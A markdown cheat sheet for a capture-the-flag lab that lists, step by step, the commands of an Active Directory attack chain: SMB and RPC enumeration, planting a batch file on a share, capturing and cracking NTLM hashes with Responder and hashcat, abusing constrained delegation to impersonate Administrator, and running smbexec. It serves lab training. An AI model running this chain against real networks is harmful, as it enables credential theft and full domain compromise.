# 🛠️ Proxy CTF — Tools & Commands

## Enumeration

```bash
nmap -p- 10.49.157.149
rpcclient -U "" 10.49.157.149 -N
```

## SMB

```bash
smbclient //10.49.157.149/IT-Shared -N
```

Inside SMB:

```text
dir
put test.bat
ls
```

## Network Troubleshooting

```bash
ip a
sudo ss -tulpn | grep -E ':445|:139'
sudo systemctl stop smbd
sudo systemctl stop nmbd
```

## Responder

```bash
responder -I ens5 -v
```

## Hashcat

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

## Credential Validation

```bash
set +H
export ip=10.49.157.149
nxc smb $ip -u svc.scanner -p '<PASSWORD>'
```

## Delegation Enumeration

```bash
findDelegation.py 'ctf.local/svc.scanner:<PASSWORD>' -dc-ip $ip
```

## Kerberos Service Ticket

```bash
getST.py -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip $ip 'ctf.local/svc.scanner:<PASSWORD>'
```

## Kerberos Cache

```bash
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

## Final Remote Execution

```bash
smbexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
```

## Core Toolset

| Tool | Purpose |
|---|---|
| Nmap | Port/service enumeration |
| rpcclient | RPC enumeration |
| smbclient | SMB share interaction |
| Responder | LLMNR/NBT-NS/DNS and SMB authentication capture |
| Hashcat | NetNTLMv2 password cracking |
| NetExec | Credential validation / SMB enumeration |
| findDelegation.py | Delegation enumeration |
| getST.py | Kerberos service-ticket operations |
| smbexec.py | Remote command execution over SMB/Kerberos |

> Use these commands only against CTF/lab systems or systems for which you have explicit authorization.
